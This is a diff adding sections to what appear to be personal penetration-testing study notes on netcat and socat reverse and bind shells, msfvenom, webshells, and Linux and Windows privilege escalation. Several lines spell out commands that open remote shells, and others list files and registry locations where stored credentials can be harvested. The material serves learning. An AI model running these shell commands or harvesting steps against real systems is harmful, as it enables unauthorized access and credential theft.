@@ -610,4 +610,131 @@ macOS - Option + Command + I
 			- **-v** is used to request a verbose output.
 			- **-n** tells netcat not to resolve host names or use DNS.
 			- **-p** indicates that the port specification will follow.
-		- 
+	- Be aware that if you choose to use a port below 1024, you will need to use **sudo** when starting your listener.
+	- A working example of this would be: **sudo nc -lvnp 443**
+- **Bind Shells**
+	- If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it. The syntax for this is relatively straight forward: **nc \<target-ip> \<chosen-port>
+- **Netcat Shell Stabilization** - These shells are very unstable by default. Pressing CTRL + C kills the whole thing. 
+- You can use Python, rlwrap, and Socat.
+- **Socat** - Socat is similar to netcat in some ways, but fundamentally different in many ways. The easiest way to think about socat is as a connector between two points.
+- **Reverse Shells** - 
+	- The syntax for socat get a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener on socat: **socat TCP-L:\<port> -
+	- On Windows we would use this command to connect back: **socat TCP:\<LOCAL-IP> EXEC:powershell.exe,pipes
+	- The "pipes" option is used to force PowerShell (or cmd.exe) to use Unix style standard input and output.
+- **Bind Shells** - 
+	- On a Linux target we would use the following command: **socat TCP-L:\<PORT> EXEC:"bash -li"
+	- On a Windows target we would use this command for our listener: **socat TCP-L:\<PORT> EXEC:powershell.exe,pipes
+	- We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.
+	- Regardless of the target, we use this command on our attacking machine to connect to the waiting listener: **socat TCP:\<TARGET-IP>:\<TARGET-PORT> -
+- **Socat Encrypted Shells** - One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a refult.
+- **Common Shell Payloads** - For some common reverse shell payloads, PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in may different languages.
+- **msvenmon** - Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit.
+- The standard syntax for msfvenom is as follows: **msfvenom -p \<PAYLOAD> \<OPTIONS>
+- **Staged vs Stageless shell payloads**
+	- **Staged** payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler.
+	- **Stageless** payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
+- **Meterpreter** - Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets.
+- **Metasploit multi/handler** - Multi/Handler is a superb tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using stage payloads.
+	- Fortunately, it's relatively easy to use:
+		- Open Metasploit with **msfconsole**
+		- Type **use multi/handler**, and press enter.
+- **WebShells** - There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a *webshell*. 
+- "Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, withe the results returned and written to the page. 
+- **Next Steps** - The one thing about shells is that they tend to be unstable and non-interactive. On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys are stored at **/home/\<user>/.ssh** areoften ideal way to do this. 
+- Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.
+### Linux Privilege Escalation
+- At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.
+- **Enumeration** - Enumeration is the first step you have to take once you gain access to any system. 
+	- **hostname** command - will return the hostname of the target machine
+	- **uname -a** command - will print system information giving us additional detail about the kernel used by the system.
+	- **proc/version** file - The proc filesystem (procfs) provides information about the target system processes.
+	- **/etc/issue** - Systems can usually be identified by looking at the **/etc/issue** file.
+	- **ps** command - The **ps** command is an effective way to see the running processes on a Linux system.
+	- **env** command - The **env** command will show environmental variables.
+	- **sudo -l** command - Can be used to list all commands your user can run using **sudo**.
+	- **ls** command - One of the most common command used in Linux is probably **ls**. Always remember to use the **ls** command with the **-la** parameter to see hidden files too.
+	- **id** command - The **id** command will provide a general overview of the user's privilege level and group memberships.
+	- **/etc/passwd** - Reading the **/etc/passwd** file can be an easy way to discover users on the system.
+	- **history** command - Looking at earlier commands with the **history** command can give us some idea about the target system and , albeit rarely, have stored information such as passwords or usernames.
+	- **ifconfig** command - The **ifconfig** command will give us information about the network interfaces of the system.
+	- **netstat** command - The **netstat** command can be used with several different options to gather information on existing connections.
+		- **netstat - a**: Shows all listening ports and established connections.
+		- **netstat -at** or **netstat -au** can also be used to list TCP or UDP protocols respectively.
+		- **netstat -l**: lists ports in "listening" mode. These ports are open and ready to accept incoming connections.
+		- **netstat -s**: list network usage by protocol.
+		- **netstat - tp**: list connections with the service name and PID information.
+		- **netstat - i**: Shows interface statistics. 
+	- **find** command - Searing the target system for important information and potential privilege escalation vectors can be fruitful. The built-in "find" command is useful and work keeping in your arsenal.
+		- **find . -name flag1.txt**: find the file name "flag1.txt" in the current directory.
+		- **find /home -name flag1.txt**: find the file names "flag1.txt" in the /home directory.
+		- **find / -type d -name config**: find the directory named config under "/'"
+		- **find / -type f -perm 0777**: find files with the 777 permissions (files readable, writable, and executable by all users)
+		- **find / -perm a=x**: find executable files.
+		- **find /home -user frank**: find all files for user "frank" under "/home"
+		- **find /-mtime 10**: find files that were modified in the last 10 days
+		- **find / -atime 10**: find files that were accessed in the last 10 days
+		- **find / -cmin -60**: find files changed within the last hour (60 minutes)
+		- **find / -amin -60**: find files accessed within the last hour (60 minutes)
+		- **find / -size 50M**: find files with a 50 MB size
+- **Automation Enumeration Tools:**
+	- LinPeas:https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+	- LinEnum: https://github.com/rebootuser/LinEnum
+	- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
+	- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
+	- Linux Priv Checker https://github.com/linted/linuxprivchecker
+- **Privilege Escalation: Kernel exploits**
+	- The Kernel exploit methodology is simple:
+		- Identify the kernel version
+		- Search and find an exploit code for the kernel version of the target system
+		- Run the exploit
+	- Research sources 
+		- Based on your findings, can use Google to search for an existing exploit code.
+		- Sources such as https://www.cvedetails.com/ can also be useful.
+		- Another alternative would be to use a script like LES (Linux Exploit Suggester)
+- **Privilege Escalation: Sudo**
+	- The sudo command, by default, allows you to run a program with root privileges. Any user can check its current situation related to root privileges using the **sudo -l** command.
+- **Privilege Escalation: SUID**
+	- Many of Linux privilege controls rely on controlling the user and files interactions. This id done with permissions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). 
+### Windows Privilege Escalation
+- **Windows Privilege Escalation** - Simply put, privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a wekness in teh target system. 
+- Windows systems mainly have two kinds of users. Depending on their access levels, we can categorize a user in one of the following groups:
+	- Administrators - These users have the most privileges. They can change any system configuration parameter and access any file in the system.
+	- Standard Users - These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files.
+- Built-in accounts used by the operating system
+	- System / LocalSystem - An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the hose with even higher privileges than adminstrators.
+	- Local Service - Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.
+	- Network Service - Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.
+- **Harvesting Passwords from Usual Spots**
+	- **Unattended Windows Installations** - When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operation system image to be deployed to several hosts through the network. These kind of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
+		- C:\Unattend.xml
+		- C:\Windows\Panther\Unattend.xml
+		- C:\Windows\Panther\Unattend\Unattend.xml
+		- C:\Windows\system32\sysprep.inf
+		- C:\Windows\system32\sysprep\sysprep.xml
+	- **PowerShell History** - Whenever a user runs a command using PowerShell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the PowerShell command line, it can later be retrieved using the following command form a **cmd.exe** prompt:
+![[Pasted image 20260302105337.png]]
+	- **Saved Windows Credentials** - Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. This command will list saved credentials: **cmdkey /list**
+	- While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the **runas** command and the **/savecred** option as ween below.
+![[Pasted image 20260302105557.png]]
+	- **IIS Configuration** - Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called **web.config** and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find the web.config in one of the following locations:
+		- C:\inetpub\wwwroot\web.config
+		- C:\Windows\Microsoft.NET\Framework64\v.4.0.30319\Config\web.config
+	- **Retrieve Credentials from Software: PuTTY** - PuTTY is an SSH client commonly found on Window systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials. To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
+![[Pasted image 20260302110035.png]]
+- **Other Quick Wins**
+	- Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
+	- **AlwaysInstallElevated** - Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allows us to generate a malicious MSI file that would run with admin privileges. 
+- **Tools of the Trade** - Several These tools can shorted the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.
+- Below are a few tools commonly used to identify privilege escalation vectors.
+	- **WinPEAS** - WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. WinPEAS can be downloaded here: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
+	- **PrivescCheck** - PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file. PrivescCehck can be downloaded here: https://github.com/itm4n/PrivescCheck
+	- **Wes-NG: Windows Exploit Suggester - Next Generation** - Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine. WES-NG is a Python script that can be found and downloaded here: https://github.com/bitsadmin/wesng
+	- **Metaploit** - If you already have a Meterpreter shell on the target system, you can use the **multi/recon/local_exploit_suggester** module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.
+- Additional techniques can be found here:
+	- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+	- https://github.com/gtworek/Priv2Admin
+	- https://github.com/antonioCoco/RogueWinRM
+	- https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
+	- https://decoder.cloud/
+	- https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf
+	- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
